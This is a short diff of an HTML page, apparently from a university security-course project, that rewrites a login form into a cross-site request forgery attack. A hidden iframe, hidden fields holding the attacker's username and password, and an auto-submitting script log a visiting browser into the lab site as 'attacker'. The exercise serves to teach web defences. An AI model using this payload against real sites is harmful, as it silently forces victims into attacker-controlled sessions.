@@ -1,9 +1,9 @@
 <html>
     <body>
-        <form action="https://project2.ecen4133.org/" method="POST">
-            <input type= "text" id="username" value= "attacker" >
-            <input type="password" id="userpass" value= "l33th4x">
-            <input type= "submit" id="log-in-btn"> 
+        <iframe name= "b-frame" id= "b-frame" style = "display: none;"></iframe>
+        <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" target= "b-frame" method="POST">
+            <input type= "hidden" name="username" value= "attacker" />
+            <input type="hidden" name="password" value= "l33th4x"/>
         </form>
         <script>
             document.forms[0].submit()
